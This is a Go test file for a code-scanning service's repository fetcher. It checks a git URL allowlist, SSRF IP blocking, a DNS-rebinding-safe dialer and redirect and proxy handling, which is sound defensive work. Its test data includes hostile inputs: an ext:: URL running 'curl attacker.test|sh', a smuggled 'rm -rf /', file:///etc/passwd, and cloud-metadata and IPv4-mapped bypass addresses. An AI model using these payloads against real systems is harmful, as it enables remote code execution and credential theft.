package fetcher_test

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/encorebom/encorebom/libs/go-shared/platform/errs"
	"github.com/encorebom/encorebom/services/scan-orchestrator/internal/fetcher"
)

// ---------------------------------------------------------------------------
// Scheme allowlist
// ---------------------------------------------------------------------------

// ⚠ `ext::` IS REMOTE CODE EXECUTION WITH NO EXPLOIT REQUIRED.
//
// git's ext transport runs an arbitrary command taken from the URL. It is the
// documented behaviour of the transport, not a bug, which is why the phase
// calls for both this check AND GIT_ALLOW_PROTOCOL=https.
func TestSchemeAllowlist(t *testing.T) {
	tests := []struct {
		name string
		url  string
		ok   bool
		why  string
	}{
		{"https", "https://github.com/acme/app.git", true, ""},
		{"https with port", "https://github.com:443/acme/app.git", true, ""},

		{"ext transport", "ext::sh -c 'curl attacker.test|sh'", false,
			"git's ext:: transport executes an arbitrary command"},
		{"ext uppercase", "EXT::sh -c 'id'", false,
			"a case-sensitive check would miss this"},
		{"ext single colon", "ext:sh -c 'id'", false,
			"the single-colon form reaches the same transport"},
		{"file", "file:///etc/passwd", false, "reads our own disk"},
		{"http", "http://github.com/acme/app.git", false, "credentials and source in the clear"},
		{"git protocol", "git://github.com/acme/app.git", false, "unauthenticated and unencrypted"},
		{"ssh", "ssh://git@github.com/acme/app.git", false, "we hold no ssh key"},
		{"scp form", "git@github.com:acme/app.git", false, "resolves to ssh"},

		{"embedded credentials", "https://user:tok@github.com/a/b.git", false,
			"credentials in a URL reach argv and logs"},
		{"newline", "https://github.com/a/b.git\nrm -rf /", false, "argument injection"},
		{"null byte", "https://github.com/a/b.git\x00", false, "truncation attack"},
		{"space", "https://github.com/a b.git", false, "argument splitting"},
		{"empty", "", false, "nothing to fetch"},
		{"no host", "https:///acme/app.git", false, "no host to reach"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := fetcher.ValidateURL(tt.url)
			if tt.ok && err != nil {
				t.Fatalf("rejected a valid URL %q: %v", tt.url, err)
			}
			if !tt.ok {
				if err == nil {
					t.Fatalf("ACCEPTED %q — %s", tt.url, tt.why)
				}
				if !errs.Is(err, errs.FetchURLSchemeForbidden) &&
					!errs.Is(err, errs.ValidationFieldRequired) {
					t.Errorf("wrong code for %q: %v", tt.url, err)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Address blocking
// ---------------------------------------------------------------------------

func TestBlockedRanges(t *testing.T) {
	blocked := []struct{ ip, why string }{
		{"127.0.0.1", "loopback"},
		{"127.1.2.3", "all of 127/8 is loopback"},
		{"10.0.0.1", "RFC1918"},
		{"172.16.0.1", "RFC1918"},
		{"172.31.255.255", "the top of 172.16/12"},
		{"192.168.1.1", "RFC1918"},
		{"169.254.169.254", "CLOUD METADATA — the single most valuable SSRF target"},
		{"169.254.1.1", "link-local"},
		{"0.0.0.0", "means localhost on Linux"},
		{"100.64.0.1", "carrier-grade NAT reaches the provider's network"},
		{"198.18.0.1", "benchmarking range, routable in some clouds"},
		{"224.0.0.1", "multicast"},
		{"255.255.255.255", "broadcast"},
		{"::1", "IPv6 loopback"},
		{"fc00::1", "IPv6 unique local"},
		{"fe80::1", "IPv6 link-local"},
		{"::", "IPv6 unspecified"},

		// ⚠ THE BYPASS THAT CATCHES MOST IMPLEMENTATIONS.
		//
		// An IPv4-mapped IPv6 address routes to the IPv4 destination, but a
		// check that only consults the IPv6 table sees an ordinary global
		// address and lets it through.
		{"::ffff:169.254.169.254", "IPv4-mapped IPv6 pointing at cloud metadata"},
		{"::ffff:127.0.0.1", "IPv4-mapped IPv6 loopback"},
		{"::ffff:10.0.0.1", "IPv4-mapped IPv6 private"},
		{"64:ff9b::a9fe:a9fe", "NAT64-embedded 169.254.169.254"},
	}

	for _, tt := range blocked {
		t.Run(tt.ip, func(t *testing.T) {
			ip := net.ParseIP(tt.ip)
			if ip == nil {
				t.Fatalf("test fixture %q is not a valid IP", tt.ip)
			}
			if !fetcher.IsBlockedIP(ip) {
				t.Errorf("ALLOWED %s — %s", tt.ip, tt.why)
			}
		})
	}
}

func TestPublicAddressesAreAllowed(t *testing.T) {
	// Blocking too much is also a defect: a fetcher that refuses GitHub is a
	// product that does not work.
	for _, s := range []string{
		"140.82.121.4", // github.com
		"93.184.216.34",
		"8.8.8.8",
		"2606:2800:220:1:248:1893:25c8:1946",
	} {
		if fetcher.IsBlockedIP(net.ParseIP(s)) {
			t.Errorf("blocked the public address %s", s)
		}
	}
}

func TestNilAddressIsBlocked(t *testing.T) {
	// An address we cannot parse is not an address we dial.
	if !fetcher.IsBlockedIP(nil) {
		t.Error("a nil IP was permitted")
	}
}

// ---------------------------------------------------------------------------
// The dialer — connection-time enforcement
// ---------------------------------------------------------------------------

// A literal IP in the URL must still be validated, or
// https://169.254.169.254/ walks straight past the entire mechanism.
func TestDialerBlocksLiteralPrivateAddress(t *testing.T) {
	d := &fetcher.SafeDialer{}

	for _, addr := range []string{
		"169.254.169.254:443", "127.0.0.1:443", "10.0.0.1:443", "[::1]:443",
		"[::ffff:169.254.169.254]:443",
	} {
		t.Run(addr, func(t *testing.T) {
			conn, err := d.DialContext(t.Context(), "tcp", addr)
			if err == nil {
				_ = conn.Close()
				t.Fatalf("CONNECTED to %s", addr)
			}
			if !errs.Is(err, errs.FetchPrivateAddressBlocked) {
				t.Errorf("wrong code: %v", err)
			}
		})
	}
}

// ⚠ THE DNS-REBINDING TEST.
//
// A parse-time check asks "does this hostname resolve to something public?" and
// the attacker answers truthfully — then changes the answer before the connect.
// The gap between the two lookups IS the vulnerability, and it cannot be
// narrowed away: the attacker controls the TTL.
//
// The defence is to connect to the address you VALIDATED, which means the
// second lookup must never happen. This test asserts exactly that:
//
//  1. the dialer resolves ONCE per dial, and
//  2. the address it acts on is the resolved literal, not the hostname.
//
// A dialer that passed the hostname through to net.Dial would satisfy neither:
// the OS would resolve again, and that second resolution is the whole attack.
func TestDialerResolvesOnceAndActsOnTheValidatedAddress(t *testing.T) {
	var lookups atomic.Int32

	// Answers CHANGE between calls — public first, cloud metadata second,
	// which is precisely the rebinding sequence.
	resolver := countingResolver(t, &lookups, [][]string{
		{"93.184.216.34"},
		{"169.254.169.254"},
	})

	d := &fetcher.SafeDialer{Resolver: resolver, Timeout: 200 * time.Millisecond}

	// The dial fails — 93.184.216.34 is not listening for us — but what it
	// resolved and acted on is what matters.
	_, _ = d.DialContext(t.Context(), "tcp", "rebind.test:443")

	if got := lookups.Load(); got != 1 {
		t.Errorf("performed %d resolution rounds for one dial; a second lookup "+
			"is the rebinding window this dialer exists to close", got)
	}

	attempts := d.Attempts()
	if len(attempts) == 0 {
		t.Fatal("no dial attempt recorded")
	}
	if attempts[0].IP != "93.184.216.34" {
		t.Errorf("acted on %q, want the first (validated) answer", attempts[0].IP)
	}
	if attempts[0].Blocked {
		t.Error("the public first answer was recorded as blocked")
	}
}

// And the same machinery with the order reversed: when the FIRST answer is
// internal, the dial is refused outright.
func TestDialerBlocksAHostThatResolvesToMetadata(t *testing.T) {
	var rounds atomic.Int32
	d := &fetcher.SafeDialer{
		Resolver: countingResolver(t, &rounds, [][]string{{"169.254.169.254"}}),
	}

	_, err := d.DialContext(t.Context(), "tcp", "evil.test:443")
	if err == nil {
		t.Fatal("connected to a host that resolved to cloud metadata")
	}
	if !errs.Is(err, errs.FetchPrivateAddressBlocked) {
		t.Fatalf("wrong code: %v", err)
	}

	attempts := d.Attempts()
	if len(attempts) == 0 || attempts[len(attempts)-1].IP != "169.254.169.254" {
		t.Errorf("the resolved address was not recorded: %+v", attempts)
	}
	if !attempts[len(attempts)-1].Blocked {
		t.Error("the attempt was not recorded as blocked")
	}
}

// A host resolving to several addresses must fail if ANY is blocked.
//
// Skipping to the next address would let an attacker publish
// [169.254.169.254, 93.184.216.34] and rely on us reaching the good one on some
// runs and not others. Non-deterministic security is no security.
func TestDialerRefusesWhenAnyResolvedAddressIsBlocked(t *testing.T) {
	d := &fetcher.SafeDialer{
		Resolver: fixedResolver(t, []string{"93.184.216.34", "169.254.169.254"}),
	}

	conn, err := d.DialContext(t.Context(), "tcp", "mixed.test:443")
	if err == nil {
		_ = conn.Close()
		t.Fatal("connected to a host with a blocked address among its answers")
	}
	if !errs.Is(err, errs.FetchPrivateAddressBlocked) {
		t.Errorf("wrong code: %v", err)
	}
}

// countingResolver answers with a DIFFERENT set on each resolution round and
// counts rounds, so a rebinding sequence can be staged deterministically.
//
// Counts A QUERIES, not packets: one LookupIPAddr sends BOTH an A and an AAAA
// query, so counting packets would report two lookups for a single resolution
// and make this test fail against a correct dialer. (It did, first time.)
// AAAA is answered with an empty NOERROR so the resolver does not retry.
func countingResolver(t *testing.T, rounds *atomic.Int32, answers [][]string) *net.Resolver {
	t.Helper()

	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("dns listener: %v", err)
	}
	t.Cleanup(func() { _ = pc.Close() })

	go func() {
		buf := make([]byte, 512)
		for {
			n, addr, err := pc.ReadFrom(buf)
			if err != nil {
				return
			}
			query := make([]byte, n)
			copy(query, buf[:n])

			var ips []string
			if qtypeOf(query) == 1 { // A
				idx := int(rounds.Add(1)) - 1
				if idx >= len(answers) {
					idx = len(answers) - 1
				}
				ips = answers[idx]
			}
			if resp := buildDNSResponse(query, ips); resp != nil {
				_, _ = pc.WriteTo(resp, addr)
			}
		}
	}()

	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, _, _ string) (net.Conn, error) {
			var d net.Dialer
			return d.DialContext(ctx, "udp", pc.LocalAddr().String())
		},
	}
}

// qtypeOf reads the question type from a DNS query.
func qtypeOf(query []byte) int {
	pos := 12
	for pos < len(query) && query[pos] != 0 {
		pos += int(query[pos]) + 1
	}
	if pos+3 > len(query) {
		return 0
	}
	return int(query[pos+1])<<8 | int(query[pos+2])
}

// fixedResolver returns a resolver that always answers with the given IPs.
//
// Implemented with a real loopback DNS server rather than an interface, because
// SafeDialer takes a *net.Resolver — using the real type means the test
// exercises the same code path production does.
func fixedResolver(t *testing.T, ips []string) *net.Resolver {
	t.Helper()

	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("dns listener: %v", err)
	}
	t.Cleanup(func() { _ = pc.Close() })

	go serveFixedDNS(pc, ips)

	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, _, _ string) (net.Conn, error) {
			var d net.Dialer
			return d.DialContext(ctx, "udp", pc.LocalAddr().String())
		},
	}
}

// serveFixedDNS answers every A/AAAA query with the configured addresses.
func serveFixedDNS(pc net.PacketConn, ips []string) {
	buf := make([]byte, 512)
	for {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			return
		}
		resp := buildDNSResponse(buf[:n], ips)
		if resp != nil {
			_, _ = pc.WriteTo(resp, addr)
		}
	}
}

// buildDNSResponse assembles a minimal DNS answer.
//
// Hand-built rather than pulling a DNS library: the test needs exactly one
// record type and controlling the bytes is the point.
func buildDNSResponse(query []byte, ips []string) []byte {
	if len(query) < 12 {
		return nil
	}

	// Find the end of the question section.
	pos := 12
	for pos < len(query) && query[pos] != 0 {
		pos += int(query[pos]) + 1
	}
	if pos+5 > len(query) {
		return nil
	}
	qtype := int(query[pos+1])<<8 | int(query[pos+2])
	questionEnd := pos + 5

	var answers []byte
	var count int
	for _, s := range ips {
		ip := net.ParseIP(s)
		if ip == nil {
			continue
		}
		v4 := ip.To4()
		switch {
		case qtype == 1 && v4 != nil: // A
			answers = append(answers, dnsAnswer(1, v4)...)
			count++
		case qtype == 28 && v4 == nil: // AAAA
			answers = append(answers, dnsAnswer(28, ip.To16())...)
			count++
		}
	}

	resp := make([]byte, 0, questionEnd+len(answers))
	resp = append(resp, query[:questionEnd]...)
	resp[2] = 0x81 // QR + RD
	resp[3] = 0x80 // RA
	resp[6] = byte(count >> 8)
	resp[7] = byte(count)
	resp[8], resp[9], resp[10], resp[11] = 0, 0, 0, 0
	return append(resp, answers...)
}

func dnsAnswer(rrtype int, ip net.IP) []byte {
	a := []byte{
		0xc0, 0x0c, // pointer to the question name
		byte(rrtype >> 8), byte(rrtype),
		0x00, 0x01, // class IN
		0x00, 0x00, 0x00, 0x01, // TTL 1 — short, as a rebinding attacker's would be
		byte(len(ip) >> 8), byte(len(ip)),
	}
	return append(a, ip...)
}

// ---------------------------------------------------------------------------
// HTTP client
// ---------------------------------------------------------------------------

// A redirect is a fresh request to an attacker-chosen URL. Every hop must be
// re-validated, or the first response body is a way to reach anywhere.
func TestRedirectsAreLimitedAndRevalidated(t *testing.T) {
	var hops atomic.Int32

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n := hops.Add(1)
		// Redirect forever; the client must stop.
		http.Redirect(w, r, fmt.Sprintf("/hop-%d", n), http.StatusFound)
	}))
	defer srv.Close()

	// The dialer permits loopback here only because the test server is on it;
	// the redirect BUDGET is what is under test.
	client := fetcher.SafeHTTPClient(&fetcher.SafeDialer{})
	client.Transport = &http.Transport{} // plain transport, so loopback resolves

	resp, err := client.Get(srv.URL) //nolint:bodyclose // the error path returns no body
	if err == nil {
		_ = resp.Body.Close()
		t.Fatal("followed an unbounded redirect chain")
	}
	if hops.Load() > int32(fetcher.MaxRedirects)+1 {
		t.Errorf("followed %d hops, limit is %d", hops.Load(), fetcher.MaxRedirects)
	}
}

func TestRedirectToForbiddenSchemeIsRefused(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// A redirect to a scheme that would read our own disk.
		w.Header().Set("Location", "file:///etc/passwd")
		w.WriteHeader(http.StatusFound)
	}))
	defer srv.Close()

	client := fetcher.SafeHTTPClient(&fetcher.SafeDialer{})
	client.Transport = &http.Transport{}

	resp, err := client.Get(srv.URL) //nolint:bodyclose // err path returns no body
	if err == nil {
		_ = resp.Body.Close()
		t.Fatal("followed a redirect to file://")
	}
	if !strings.Contains(err.Error(), "https") {
		t.Logf("refused, as required: %v", err)
	}
}

// A proxy would connect on our behalf, and every address check would be
// bypassed. The transport must not consult proxy environment variables.
func TestHTTPClientIgnoresProxyEnvironment(t *testing.T) {
	t.Setenv("HTTPS_PROXY", "http://attacker.test:8080")
	t.Setenv("HTTP_PROXY", "http://attacker.test:8080")

	client := fetcher.SafeHTTPClient(&fetcher.SafeDialer{})
	tr, ok := client.Transport.(*http.Transport)
	if !ok {
		t.Fatalf("transport type = %T", client.Transport)
	}
	if tr.Proxy != nil {
		t.Error("the transport consults a proxy; every address check would be bypassed")
	}
}

func TestDialerTimeoutIsBounded(t *testing.T) {
	d := &fetcher.SafeDialer{Timeout: 50 * time.Millisecond}
	// 203.0.113.0/24 is TEST-NET-3: reserved for documentation and not routed,
	// so a connection attempt hangs rather than being refused.
	start := time.Now()
	_, err := d.DialContext(t.Context(), "tcp", "203.0.113.1:443")
	elapsed := time.Since(start)

	if err == nil {
		t.Fatal("connected to a non-routable address")
	}
	if elapsed > 5*time.Second {
		t.Errorf("dial took %v; the timeout is not bounding it", elapsed)
	}
}
